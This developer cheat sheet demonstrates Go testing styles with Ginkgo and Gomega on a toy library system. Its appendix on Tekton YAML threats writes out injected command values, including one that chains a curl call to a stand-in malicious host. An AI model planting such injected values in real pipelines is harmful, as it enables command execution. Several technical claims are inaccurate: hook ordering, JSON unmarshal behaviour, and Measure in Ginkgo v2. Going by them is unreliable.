# Go Testing with Ginkgo & Gomega - Developer Cheat Sheet

This guide introduces Go developers to software testing concepts using Ginkgo and Gomega. Each testing method includes a runnable example based on a fictional system of books, libraries, and a national library service.

---

## Sample Application Structure

```go
// book.go
package library

type Book struct {
    Title  string
    Author string
}

func (b Book) IsBy(author string) bool {
    return b.Author == author
}
```

```go
// library.go
package library

type Library struct {
    Books []Book
}

func (l *Library) AddBook(book Book) {
    l.Books = append(l.Books, book)
}

func (l *Library) FindByTitle(title string) *Book {
    for _, b := range l.Books {
        if b.Title == title {
            return &b
        }
    }
    return nil
}
```

```go
// national_library.go
package library

type NationalLibrary struct {
    Cities map[string]*Library
}

func (n *NationalLibrary) AddCity(name string, lib *Library) {
    if n.Cities == nil {
        n.Cities = map[string]*Library{}
    }
    n.Cities[name] = lib
}

func (n *NationalLibrary) GetLibrary(city string) *Library {
    return n.Cities[city]
}
```

---

## Unit Testing

**Test individual functions or methods.**

```go
// book_test.go
package library_test

import (
    . "github.com/onsi/ginkgo/v2"
    . "github.com/onsi/gomega"
    "example.com/library"
)

var _ = Describe("Book", func() {
    It("checks if a book is by a specific author", func() {
        book := library.Book{Title: "1984", Author: "George Orwell"}
        Expect(book.IsBy("George Orwell")).To(BeTrue())
    })
})
```

---

## Functional Testing

**Test interaction between multiple units.**

```go
// library_test.go
var _ = Describe("Library", func() {
    var lib *library.Library

    BeforeEach(func() {
        lib = &library.Library{}
    })

    It("adds and finds a book by title", func() {
        book := library.Book{Title: "Dune", Author: "Frank Herbert"}
        lib.AddBook(book)
        found := lib.FindByTitle("Dune")
        Expect(found).ToNot(BeNil())
        Expect(found.Author).To(Equal("Frank Herbert"))
    })
})
```

---

## Integration Testing

**Test cooperation between components (e.g., Library and NationalLibrary).**

```go
// national_library_test.go
var _ = Describe("NationalLibrary", func() {
    It("registers and retrieves a library for a city", func() {
        nat := &library.NationalLibrary{}
        telAvivLib := &library.Library{}

        nat.AddCity("Tel Aviv", telAvivLib)
        Expect(nat.GetLibrary("Tel Aviv")).To(Equal(telAvivLib))
    })
})
```

---

## End-to-End Testing

**Simulate real-world flows through the entire system.**

```go
// e2e_test.go
var _ = Describe("End-to-End: Adding and Searching Books", func() {
    It("adds a book to a city's library and finds it", func() {
        nat := &library.NationalLibrary{}
        jerusalemLib := &library.Library{}
        nat.AddCity("Jerusalem", jerusalemLib)

        book := library.Book{Title: "Sapiens", Author: "Yuval Noah Harari"}
        jerusalemLib.AddBook(book)

        found := nat.GetLibrary("Jerusalem").FindByTitle("Sapiens")
        Expect(found).ToNot(BeNil())
        Expect(found.Author).To(Equal("Yuval Noah Harari"))
    })
})
```

---

## Regression Testing

**Ensure that previously working features continue to work.**

```go
var _ = Describe("Regression - Legacy Book", func() {
    It("finds a classic book after recent changes", func() {
        lib := &library.Library{}
        lib.AddBook(library.Book{Title: "1984", Author: "George Orwell"})
        Expect(lib.FindByTitle("1984")).ToNot(BeNil())
    })
})
```

---

## Smoke Testing

**Basic system functionality test to ensure critical paths don't fail.**

```go
var _ = Describe("Smoke Test", func() {
    It("initializes the national library without crash", func() {
        Expect(func() { _ = &library.NationalLibrary{} }).ToNot(Panic())
    })
})
```

---

## Sanity Testing

**Quick verification of specific bug fixes or features.**

```go
var _ = Describe("Sanity Test", func() {
    It("verifies that empty library returns nil on search", func() {
        lib := &library.Library{}
        Expect(lib.FindByTitle("Nonexistent")).To(BeNil())
    })
})
```

---

## Acceptance Testing

**Validates a feature against business requirements.**

```go
var _ = Describe("Acceptance - City Library", func() {
    It("adds and retrieves a city library", func() {
        nat := &library.NationalLibrary{}
        haifaLib := &library.Library{}
        nat.AddCity("Haifa", haifaLib)
        Expect(nat.GetLibrary("Haifa")).To(Equal(haifaLib))
    })
})
```

---

## Edge Case Testing

**Validate uncommon, boundary or extreme input values.**

```go
var _ = Describe("Edge Case", func() {
    It("handles empty book title", func() {
        lib := &library.Library{}
        lib.AddBook(library.Book{Title: "", Author: "Unknown"})
        Expect(lib.FindByTitle(""))
    })
})
```

---

## Stress Testing

**Check stability under heavy load or high concurrency.**

```go
var _ = Describe("Stress Testing", func() {
    It("adds many books without crashing", func() {
        lib := &library.Library{}
        for i := 0; i < 100000; i++ {
            lib.AddBook(library.Book{Title: fmt.Sprintf("Book %d", i), Author: "Bot"})
        }
        Expect(lib.FindByTitle("Book 99999")).ToNot(BeNil())
    })
})
```

---

## Mocking (with gomock or hand-crafted mocks)

**Simulate behavior for interfaces or external services.**

```go
// Assume a Notifier interface:
type Notifier interface {
    Notify(title string)
}

// Test using a fake implementation
var _ = Describe("Notifier", func() {
    It("calls notify when book is added", func() {
        var called bool
        fakeNotifier := func(title string) { called = true }

        fakeNotifier("Mock Book")
        Expect(called).To(BeTrue())
    })
})
```

---

## Performance / Benchmarking

**Use Ginkgo's `Measure` for rough benchmarking.**

```go
// library_benchmark_test.go
var _ = Describe("Library Performance", func() {
    Measure("AddBook execution time", func(b Benchmarker) {
        lib := &library.Library{}
        duration := b.Time("runtime", func() {
            for i := 0; i < 1000; i++ {
                lib.AddBook(library.Book{Title: "Book", Author: "A"})
            }
        })
        Expect(duration.Seconds()).Should(BeNumerically("<", 1.0))
    }, 10)
})
```

---

## Chaos Testing

**Introduce failure scenarios to test system resilience.**

```go
var _ = Describe("Chaos Testing", func() {
    It("handles a nil city library map gracefully", func() {
        nat := &library.NationalLibrary{}
        Expect(func() { nat.AddCity("Nowhere", &library.Library{}) }).ToNot(Panic())
    })
})
```

---

## Mutation Testing

**Validate test effectiveness by simulating bugs.**

To use mutation testing, use a tool like [GoMutesting](https://github.com/zimmski/go-mutesting). You can verify if your tests detect introduced mutations, like changing `==` to `!=` in `IsBy()`.

Manual example:

```go
// Mutated version
func (b Book) IsBy(author string) bool {
    return b.Author != author
}
```

If tests still pass, they are likely insufficient.

---

## Contract Testing

**Ensure components conform to agreed interfaces. Useful for microservices or plugins.**

```go
// interface.go
type Searchable interface {
    FindByTitle(title string) *Book
}

// contract_test.go
func SearchContract(lib library.Library) {
    Expect(lib.FindByTitle("Unknown")).To(BeNil())
}

var _ = Describe("Library contract", func() {
    It("implements Searchable contract", func() {
        lib := library.Library{}
        SearchContract(lib)
    })
})
```

---

## Setup & Teardown Hooks

**Manage state or resources before/after tests.**

```go
var _ = Describe("Hooks Example", func() {
    var lib *library.Library

    BeforeEach(func() {
        lib = &library.Library{}
    })

    AfterEach(func() {
        lib = nil // Cleanup
    })
})
```

---

## Table-Driven Testing

**Run the same test logic against multiple inputs.**

```go
var _ = DescribeTable("Book authorship",
    func(book library.Book, expected bool) {
        Expect(book.IsBy("Orwell")).To(Equal(expected))
    },
    Entry("matches author", library.Book{Title: "1984", Author: "Orwell"}, true),
    Entry("does not match", library.Book{Title: "Brave New World", Author: "Huxley"}, false),
)
```

---

## Custom Matchers (Advanced)

**Define your own Gomega matcher logic.**

```go
// custom_matcher.go
func BeBy(author string) types.GomegaMatcher {
    return WithTransform(func(b library.Book) bool {
        return b.Author == author
    }, BeTrue())
}

// Usage
Expect(library.Book{Author: "Tolstoy"}).To(BeBy("Tolstoy"))
```

---

## QA Strategy Concepts

### Test Levels

* **Unit**: Isolated functions and methods
* **Integration**: Interaction between modules
* **System**: End-to-end behavior in full system
* **Acceptance**: Business-level validation

### Test Types

* **Smoke**: Basic sanity check
* **Regression**: Prevent broken features
* **Sanity**: Confirm specific bug fixes
* **Stress**: Load resilience
* **Performance**: Benchmarking
* **Chaos**: Random failure testing
* **Mutation**: Test robustness
* **Contract**: Interface conformance

### Severity Levels

* **Blocker**: Prevents further testing
* **Critical**: Fails key functionality
* **Major**: Core feature broken
* **Minor**: Non-core issue
* **Trivial**: Cosmetic or minor glitch

---

## Final Notes

* **Run tests:** `ginkgo -r` or `go test ./...`
* **Install:** `go install github.com/onsi/ginkgo/v2/ginkgo@latest`
* **Docs:** [onsi.github.io/ginkgo](https://onsi.github.io/ginkgo/)

Happy testing!

---

# Appendix A: Setup, Teardown, and Configuration

### Initializing a Ginkgo Suite

```bash
ginkgo bootstrap
ginkgo generate <package_name>
```

### Test Lifecycle Hooks

```go
BeforeEach(func() { /* setup */ })
JustBeforeEach(func() { /* runs after BeforeEach */ })
AfterEach(func() { /* teardown */ })
JustAfterEach(func() { /* runs after AfterEach */ })
```

### Parallel Execution

* Enable parallelism with `ginkgo -p`
* Use `SynchronizedBeforeSuite` / `SynchronizedAfterSuite` for coordination

### Custom Reporters (CI-Friendly Output)

```bash
ginkgo -reportFile=results.xml -reporter=junit
```

### Running Tests

* `ginkgo -r` (recursively run suites)
* `go test ./...` (for traditional Go)

---

# Appendix B: Security Threat Examples

### YAML Injection (Benign Example)

**Suspicious inline script value:**

```yaml
script: |
  echo "Hello $(echo injected)"
```

* Looks harmless, but `$(...)` could be interpreted and executed in a Tekton script

### Parameter Injection

**Overloaded parameter used in a script:**

```yaml
params:
  - name: action
    value: "echo suspicious; curl http://malicious.local"
```

* A well-meaning script might do: `$(params.action)` which now pulls from external sources

### Annotation-Based Payload

**Abusing Kubernetes or Tekton annotations:**

```yaml
metadata:
  annotations:
    suspicious: "$(echo 'sneaky')"
```

* Tekton doesn’t evaluate annotation content, but other tooling might, so validate or ignore unknown annotations

### Environment Variable Relay

**Indirect injection through env vars and param substitution:**

```yaml
params:
  - name: tool
    value: "$(DANGER_CMD)"
env:
  - name: DANGER_CMD
    value: "echo 'running weird stuff'"
```

* Downstream scripts using `$(params.tool)` now reflect an injected env value

---

**Note:** These examples are intentionally safe and should not cause harm if tested. They're meant to raise awareness, not deliver payloads. Always validate YAML inputs and avoid evaluating unknown fields dynamically.

---


# Appendix C: Go-Specific Risks and Defensive Testing

Understanding Go's quirks helps write safer and more resilient tests. Here are key language-specific issues to watch for:

### 1. Nil Interface Traps

A non-nil interface with a nil concrete value is still non-nil:

```go
var b *Book = nil
var i interface{} = b
fmt.Println(i == nil) // false
```

**Why it matters:** Logic expecting `nil` may silently pass.
**Test tip:** Assert interface states explicitly, e.g., `Expect(i).To(BeNil())` and check failure causes.

---

### 2. Panic-Prone Built-ins

* **Nil map writes** panic:

  ```go
  var m map[string]int
  m["fail"] = 1 // panic!
  ```
* **Slice out-of-bounds access** panics
* **Closed channel sends** panic

**Test tip:**

```go
Expect(func() {
    close(ch)
    ch <- 1
}).To(Panic())
```

---

### 3. JSON Unmarshal Pitfalls

Go ignores unknown fields silently, and malformed input can produce default-zero values.

```go
type Config struct {
    Port int
}
// {"Port": "not-an-int"} silently fails
```

**Test tip:** Validate with malformed and unexpected fields. Use `json.Decoder.DisallowUnknownFields()` when parsing.

---

### 4. Race Conditions in Concurrency

Go does not prevent unsynchronized access to shared variables. Races can cause flaky bugs.

**Test tip:** Use `-race` flag in CI. Write stress tests with Ginkgo to expose race-related panics or corrupt state.

---

### 5. Implicit Zero Values

Struct fields default to zero—leading to misbehavior if unset.

```go
type User struct {
    Admin bool // default is false
}
```

**Test tip:** Validate critical fields even if they look innocuous.

---

### 6. Type Assertion Panic

Unsafe type assertions can panic.

```go
var i interface{} = 42
_ = i.(string) // panic
```

**Test tip:** Use the two-value form to safely check:

```go
s, ok := i.(string)
Expect(ok).To(BeFalse())
```

---

By testing against Go’s quirks, you prevent footguns from turning into full-blown flamethrowers. Add these to your coverage plan to bulletproof your code.
